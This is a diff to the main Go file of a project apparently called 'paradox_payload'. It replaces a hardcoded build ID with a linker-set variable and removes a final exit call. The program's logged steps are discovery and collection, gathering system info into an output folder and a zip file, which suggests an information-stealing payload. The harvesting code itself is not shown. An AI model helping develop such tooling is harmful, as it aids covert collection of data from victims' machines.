@@ -10,6 +10,9 @@ import (
 	"paradox_payload/fileops"
 )
 
+// BuildID will be set by the linker
+var BuildID string
+
 func createOutputDir(path string) error {
 	if err := os.MkdirAll(path, 0755); err != nil {
 		fmt.Printf("Fatal: Failed to create output directory '%s': %v\n", path, err)
@@ -19,11 +22,13 @@ func createOutputDir(path string) error {
 }
 
 func main() {
+	// Print the received BuildID (optional, for verification)
+	fmt.Printf("Payload running with BuildID: %s\n", BuildID)
+
 	fmt.Println("Starting discovery and collection...")
 
 	baseOutputDir := "out"
 	zipFileName := "output.zip"
-	buildID := "TestBuild123"
 
 	outPaths := map[string]string{
 		"Base":     baseOutputDir,
@@ -65,7 +70,7 @@ func main() {
 	}
 
 	fmt.Println("Collecting system info...")
-	if err := extraction.CollectSystemInfo(buildID, outPaths["Base"]); err != nil {
+	if err := extraction.CollectSystemInfo(BuildID, outPaths["Base"]); err != nil {
 		fmt.Printf("Error collecting system info: %v\n", err)
 	}
 
@@ -166,6 +171,4 @@ func main() {
 	}
 
 	fmt.Println("Process completed.")
-
-	os.Exit(0)
 }
